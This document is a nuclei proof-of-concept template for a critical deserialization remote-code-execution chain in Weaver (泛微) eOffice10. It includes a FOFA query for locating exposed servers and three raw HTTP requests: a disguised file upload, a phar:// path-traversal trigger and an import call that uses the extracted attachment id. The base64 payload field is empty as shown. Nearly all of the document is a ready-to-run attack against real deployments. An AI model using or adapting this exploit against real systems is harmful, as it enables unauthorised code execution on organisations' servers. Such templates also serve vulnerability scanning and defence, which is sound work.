content:
# Add your nuclei formatted PoC!
id: fanwei-eoffice10-laravel-rce

info:
  name: 泛微-eoffice10-laravel-反序列化
  author: 蜜汁狗蛋
  severity: critical
  metadata:
    fofa-query: body="eoffice-loading-tip" || app="泛微-EOffice" || body="/general/login/index.php"

requests:
  - raw:
      - |     
        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
        Host: {{Hostname}}
        Accept: string("*/*")
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=fssjtbwy

        --fssjtbwy
        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
        Content-Type: image/jpeg

        {{base64_decode("")}}
        --fssjtbwy--

      - |     
        POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F

      - |     
        POST /eoffice10/server/public/api/empower/import HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        type=tttt&file={{key}}

    extractors:
      - type: json
        internal: true
        name: key
        json:
          - '.data.attachment_id'
    matchers:
      - type: dsl
        dsl:
          - 'status_code_3==200 && contains_all(body_3,"12321")'
author: 蜜汁狗蛋
